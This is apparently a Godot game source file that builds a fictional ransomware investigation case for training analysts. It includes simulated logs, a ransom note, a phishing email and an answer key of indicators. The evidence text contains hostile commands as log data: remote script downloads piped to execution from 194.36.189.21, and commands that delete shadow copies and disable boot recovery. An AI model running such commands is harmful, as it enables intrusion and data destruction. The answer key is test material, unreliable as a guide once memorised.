class_name SampleCaseLoader
extends RefCounted
## Creates a sample DFIR case with realistic evidence for testing/demo.
## This is the "Intern's First Case" - a ransomware incident at a small company.

static func create_tutorial_case() -> CaseData:
	var case_data := CaseData.new()
	case_data.case_id = "CASE-2024-001"
	case_data.title = "Ransomware Incident - Acme Widget Corp"
	case_data.description = "Acme Widget Corp (50 employees, manufacturing) reported encrypted files across their network at 6:47 AM. Ransom note demands 2 BTC. CEO is panicking. IT admin says he 'rebooted everything' before calling us."
	case_data.severity = CaseData.Severity.HIGH
	case_data.deadline_hours = 48.0
	case_data.reputation_reward = 10.0
	case_data.is_guided = true
	case_data.attack_technique_ids = PackedStringArray([
		"T1566.001", "T1059.001", "T1053.005", "T1486", "T1070.001"
	])

	# Create client
	var client := ClientData.new()
	client.client_id = "client_acme"
	client.name = "Dave Morrison"
	client.title = "CEO"
	client.organization = "Acme Widget Corp"
	client.industry = "Manufacturing"
	client.personality = ClientData.Personality.PANICKED_CEO
	client.trust_level = ClientData.TrustLevel.COOPERATIVE
	client.technical_level = 0.1
	client.stress_response = 0.9
	client.honesty = 0.8
	client.backstory = "Dave started Acme Widget Corp 15 years ago. He knows nothing about cybersecurity but his company's manufacturing line is now completely offline. He's been up since 5 AM and has already called his lawyer."
	case_data.client = client

	# Create evidence items
	case_data.evidence_items = _create_evidence()

	# Create ground truth IOCs
	case_data.correct_iocs = _create_correct_iocs()

	return case_data


static func _create_evidence() -> Array[EvidenceData]:
	var evidence: Array[EvidenceData] = []

	# 1. Windows Security Event Log
	var security_log := EvidenceData.new()
	security_log.evidence_id = "ev_security_evtx"
	security_log.type = EvidenceData.EvidenceType.WINDOWS_EVTX
	security_log.name = "Security.evtx"
	security_log.description = "Windows Security Event Log from the file server (ACME-FS01)"
	security_log.vfs_path = "/evidence/logs/Security.evtx"
	security_log.hidden_iocs = PackedStringArray(["192.168.1.50", "admin_backup", "T1059.001"])
	security_log.content = """<Event><System><EventID>4624</EventID><TimeCreated SystemTime='2024-01-14T22:15:33'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='LogonType'>3</Data><Data Name='TargetUserName'>jsmith</Data><Data Name='IpAddress'>192.168.1.25</Data></EventData></Event>
<Event><System><EventID>4624</EventID><TimeCreated SystemTime='2024-01-14T23:02:17'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='LogonType'>10</Data><Data Name='TargetUserName'>admin_backup</Data><Data Name='IpAddress'>192.168.1.50</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:00:01'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:00:03'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:00:05'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>admin</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:00:08'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>admin</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:00:11'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>backup_admin</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4625</EventID><TimeCreated SystemTime='2024-01-14T23:01:55'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TargetUserName'>admin_backup</Data><Data Name='IpAddress'>192.168.1.50</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>
<Event><System><EventID>4624</EventID><TimeCreated SystemTime='2024-01-14T23:02:17'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='LogonType'>10</Data><Data Name='TargetUserName'>admin_backup</Data><Data Name='IpAddress'>192.168.1.50</Data></EventData></Event>
<Event><System><EventID>4688</EventID><TimeCreated SystemTime='2024-01-14T23:05:44'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='NewProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='SubjectUserName'>admin_backup</Data></EventData></Event>
<Event><System><EventID>4104</EventID><TimeCreated SystemTime='2024-01-14T23:06:12'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='ScriptBlockText'>Invoke-Expression (New-Object Net.WebClient).DownloadString('http://194.36.189.21/stage2.ps1')</Data><Data Name='Path'>PowerShell</Data></EventData></Event>
<Event><System><EventID>7045</EventID><TimeCreated SystemTime='2024-01-14T23:08:30'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='ServiceName'>WindowsUpdateHelper</Data><Data Name='ImagePath'>C:\\ProgramData\\svchost.exe</Data><Data Name='ServiceType'>user mode service</Data><Data Name='StartType'>auto start</Data></EventData></Event>
<Event><System><EventID>4698</EventID><TimeCreated SystemTime='2024-01-14T23:09:15'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='TaskName'>\\Microsoft\\Windows\\UpdateCheck</Data><Data Name='TaskContent'>cmd.exe /c C:\\ProgramData\\svchost.exe</Data><Data Name='SubjectUserName'>admin_backup</Data></EventData></Event>
<Event><System><EventID>4688</EventID><TimeCreated SystemTime='2024-01-15T05:30:00'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='NewProcessName'>C:\\ProgramData\\encrypt.exe</Data><Data Name='ParentProcessName'>C:\\ProgramData\\svchost.exe</Data><Data Name='SubjectUserName'>SYSTEM</Data></EventData></Event>
<Event><System><EventID>1102</EventID><TimeCreated SystemTime='2024-01-15T05:45:22'/><Computer>ACME-FS01</Computer></System><EventData><Data Name='SubjectUserName'>admin_backup</Data></EventData></Event>"""
	evidence.append(security_log)

	# 2. Syslog from Linux web server
	var syslog := EvidenceData.new()
	syslog.evidence_id = "ev_webserver_syslog"
	syslog.type = EvidenceData.EvidenceType.LINUX_SYSLOG
	syslog.name = "auth.log"
	syslog.description = "Auth log from the Linux web server (acme-web01)"
	syslog.vfs_path = "/evidence/logs/auth.log"
	syslog.hidden_iocs = PackedStringArray(["192.168.1.50", "194.36.189.21"])
	syslog.content = """Jan 14 18:30:15 acme-web01 sshd[4521]: Accepted password for www-data from 192.168.1.25 port 52431
Jan 14 21:45:33 acme-web01 sshd[4888]: Failed password for root from 194.36.189.21 port 43122
Jan 14 21:45:35 acme-web01 sshd[4888]: Failed password for root from 194.36.189.21 port 43122
Jan 14 21:45:38 acme-web01 sshd[4888]: Failed password for root from 194.36.189.21 port 43122
Jan 14 21:45:41 acme-web01 sshd[4888]: Failed password for admin from 194.36.189.21 port 43122
Jan 14 21:46:02 acme-web01 sshd[4888]: Accepted password for webadmin from 194.36.189.21 port 43122
Jan 14 21:47:15 acme-web01 sudo: webadmin : TTY=pts/0 ; PWD=/home/webadmin ; USER=root ; COMMAND=/bin/bash
Jan 14 21:48:33 acme-web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=194.36.189.21 DST=192.168.1.10 PROTO=TCP SPT=8443 DPT=4444
Jan 14 21:50:01 acme-web01 CRON[5102]: (root) CMD (curl -s http://194.36.189.21/payload.sh | bash)
Jan 14 21:52:44 acme-web01 sshd[5200]: Accepted publickey for root from 192.168.1.50 port 22
Jan 14 22:00:00 acme-web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=10.0.0.1 DST=192.168.1.10 PROTO=ICMP"""
	evidence.append(syslog)

	# 3. Apache access log
	var apache := EvidenceData.new()
	apache.evidence_id = "ev_apache_access"
	apache.type = EvidenceData.EvidenceType.APACHE_LOG
	apache.name = "access.log"
	apache.description = "Apache access log from acme-web01"
	apache.vfs_path = "/evidence/logs/access.log"
	apache.hidden_iocs = PackedStringArray(["194.36.189.21", "/wp-admin/setup-config.php"])
	apache.content = """192.168.1.25 - - [14/Jan/2024:14:22:01 +0000] "GET /index.html HTTP/1.1" 200 3421
192.168.1.30 - - [14/Jan/2024:15:10:33 +0000] "GET /products HTTP/1.1" 200 8842
194.36.189.21 - - [14/Jan/2024:20:01:15 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 196
194.36.189.21 - - [14/Jan/2024:20:01:18 +0000] "GET /wp-login.php HTTP/1.1" 404 196
194.36.189.21 - - [14/Jan/2024:20:02:05 +0000] "GET /.env HTTP/1.1" 200 142
194.36.189.21 - - [14/Jan/2024:20:02:08 +0000] "GET /server-status HTTP/1.1" 403 199
194.36.189.21 - - [14/Jan/2024:20:03:44 +0000] "POST /api/upload HTTP/1.1" 200 44 "-" "Mozilla/5.0 (compatible; Googlebot/2.1)"
194.36.189.21 - - [14/Jan/2024:20:15:22 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 196
194.36.189.21 - - [14/Jan/2024:20:30:01 +0000] "POST /api/upload HTTP/1.1" 200 4422 "-" "python-requests/2.28.1"
192.168.1.25 - - [14/Jan/2024:21:00:00 +0000] "GET /dashboard HTTP/1.1" 200 5100"""
	evidence.append(apache)

	# 4. Ransom note
	var ransom := EvidenceData.new()
	ransom.evidence_id = "ev_ransom_note"
	ransom.type = EvidenceData.EvidenceType.EMAIL
	ransom.name = "README_RESTORE.txt"
	ransom.description = "Ransom note found on encrypted file server"
	ransom.vfs_path = "/evidence/artifacts/README_RESTORE.txt"
	ransom.content = """!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

All your files, documents, databases, and backups have been encrypted
using military-grade AES-256 encryption.

DO NOT attempt to decrypt files yourself - this will damage them permanently.
DO NOT contact law enforcement - this will only delay recovery.
DO NOT rename encrypted files.

To recover your files:
1. Send exactly 2.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
2. Email proof of payment to: restore_files_2024@protonmail.com
3. You will receive the decryption key within 24 hours.

Your unique ID: ACME-7F3A-9B2C-E41D

If payment is not received within 72 hours, the price doubles.
After 7 days, your decryption key will be permanently deleted.

-- DarkLock Ransomware Group"""
	evidence.append(ransom)

	# 5. Suspicious binary metadata
	var binary := EvidenceData.new()
	binary.evidence_id = "ev_binary"
	binary.type = EvidenceData.EvidenceType.DISK_IMAGE
	binary.name = "svchost.exe"
	binary.description = "Suspicious binary found in C:\\ProgramData\\ (not real svchost.exe)"
	binary.vfs_path = "/evidence/artifacts/svchost.exe.strings"
	binary.hidden_iocs = PackedStringArray(["194.36.189.21", "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "DarkLock"])
	binary.content = """MZ
This program cannot be run in DOS mode
.text
.rdata
.data
kernel32.dll
CreateFileW
WriteFile
ReadFile
GetSystemDirectoryW
FindFirstFileW
FindNextFileW
CryptAcquireContextW
CryptGenRandom
CryptEncrypt
WinHttpOpen
WinHttpConnect
WinHttpOpenRequest
http://194.36.189.21/beacon
POST /api/checkin
User-Agent: Mozilla/5.0 DarkLock/3.1
X-Bot-ID: ACME-7F3A-9B2C-E41D
AES-256-CBC
RSA-2048
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
restore_files_2024@protonmail.com
README_RESTORE.txt
.darklock
encrypt_file
enumerate_shares
kill_services
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No"""
	evidence.append(binary)

	# 6. Email (phishing)
	var phish := EvidenceData.new()
	phish.evidence_id = "ev_phishing_email"
	phish.type = EvidenceData.EvidenceType.EMAIL
	phish.name = "phishing_email.eml"
	phish.description = "Suspicious email found in jsmith's mailbox from Jan 14"
	phish.vfs_path = "/evidence/email/phishing_email.eml"
	phish.hidden_iocs = PackedStringArray(["invoice-update@acme-billing.com", "194.36.189.21"])
	phish.content = """From: invoice-update@acme-billing.com
To: jsmith@acmewidgets.com
Date: Mon, 14 Jan 2024 16:30:00 -0500
Subject: URGENT: Updated Invoice #4521 - Payment Required
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_1234"
X-Mailer: Microsoft Outlook 16.0
Return-Path: <bounce-7732@mail.194.36.189.21.sslip.io>

Dear John,

Please find attached the updated invoice for your recent order.
The payment terms have changed - please review and process by end of day.

Note: You may need to enable macros to view the full invoice details.

Best regards,
Acme Billing Department

[Attachment: Invoice_4521_Updated.xlsm (245 KB)]
[SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456]"""
	evidence.append(phish)

	return evidence


static func _create_correct_iocs() -> Array[IOCData]:
	var iocs: Array[IOCData] = []

	iocs.append(IOCData.create(IOCData.IOCType.IP_ADDRESS, "194.36.189.21", "C2 server - initial access and payload delivery"))
	iocs.append(IOCData.create(IOCData.IOCType.IP_ADDRESS, "192.168.1.50", "Internal pivot point - compromised workstation"))
	iocs.append(IOCData.create(IOCData.IOCType.DOMAIN, "acme-billing.com", "Phishing domain (typosquat)"))
	iocs.append(IOCData.create(IOCData.IOCType.EMAIL_ADDRESS, "invoice-update@acme-billing.com", "Phishing sender"))
	iocs.append(IOCData.create(IOCData.IOCType.EMAIL_ADDRESS, "restore_files_2024@protonmail.com", "Ransomware payment contact"))
	iocs.append(IOCData.create(IOCData.IOCType.FILE_PATH, "C:\\ProgramData\\svchost.exe", "DarkLock ransomware binary (masquerading)"))
	iocs.append(IOCData.create(IOCData.IOCType.FILE_PATH, "C:\\ProgramData\\encrypt.exe", "Encryption payload"))
	iocs.append(IOCData.create(IOCData.IOCType.PROCESS_NAME, "WindowsUpdateHelper", "Malicious service for persistence"))
	iocs.append(IOCData.create(IOCData.IOCType.FILE_HASH_SHA256, "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456", "Invoice_4521_Updated.xlsm"))
	iocs.append(IOCData.create(IOCData.IOCType.URL, "http://194.36.189.21/stage2.ps1", "PowerShell payload URL"))
	iocs.append(IOCData.create(IOCData.IOCType.URL, "http://194.36.189.21/beacon", "C2 beacon URL"))

	return iocs
